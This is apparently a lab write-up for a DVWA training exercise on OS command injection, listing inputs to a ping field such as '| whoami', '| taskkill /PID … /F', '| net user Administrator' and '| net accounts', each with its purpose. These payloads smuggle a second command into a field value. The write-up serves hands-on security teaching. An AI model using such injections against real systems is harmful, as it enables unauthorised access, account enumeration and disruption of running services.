# Exercise 18: OS Command Injection (DVWA)

## Objective
Exploit an **OS Command Injection** vulnerability in DVWA to execute Windows system commands and enumerate the target machine.

---

# Commands Used

## 1. Test Normal Functionality
```text
192.168.0.18
```

**Purpose**
- Verify that the Ping feature works normally.

---

## 2. Find Hostname
```text
192.168.0.18 | hostname
```

**Purpose**
- Displays the target machine's hostname.
- Confirms command injection is possible.

---

## 3. Find Current User
```text
192.168.0.18 | whoami
```

**Purpose**
- Displays the user account running the web server.
- Example:
```
nt authority\system
www-data
Administrator
```

---

## 4. View Running Processes
```text
192.168.0.18 | tasklist
```

**Purpose**
- Lists all running processes.
- Note the PID of any process.

Example:
```
RuntimeBroker.exe    1224
```

---

## 5. Kill a Process
```text
192.168.0.18 | taskkill /PID 1224 /F
```

**Purpose**
- Terminates the selected process.
- Demonstrates that command execution can modify the target system.

Verify:
```text
192.168.0.18 | tasklist
```

---

## 6. List Files & Folders
```text
192.168.0.18 | dir C:\
```

**Purpose**
- Displays the contents of the C: drive.
- Helps identify interesting folders like:
  - Users
  - Windows
  - Program Files
  - inetpub
  - wamp64

---

## 7. Enumerate User Accounts
```text
192.168.0.18 | net user
```

**Purpose**
- Lists all local user accounts.

Example:
```
Administrator
Guest
DefaultAccount
```

---

## 8. View Administrator Details
```text
192.168.0.18 | net user Administrator
```

**Purpose**
- Displays detailed information about the Administrator account.

Useful information:
- Account status
- Password age
- Group membership

---

## 9. Retrieve Password Policy (Lab Answer)
```text
192.168.0.18 | net accounts
```

**Purpose**
- Displays Windows password policy.

Shows:
- Minimum password length
- Maximum password age
- Lockout policy
- **Computer Role** ✅ (Lab Answer)

---

# Key Learning

- OS Command Injection allows attackers to execute operating system commands.
- Using command separators (`|`, `&&`, `;`, etc.), attackers can append malicious commands.
- After gaining command execution, a pentester performs **system enumeration**:
  - Identify hostname
  - Check current user
  - List running processes
  - Explore directories
  - Enumerate user accounts
  - Retrieve password policy
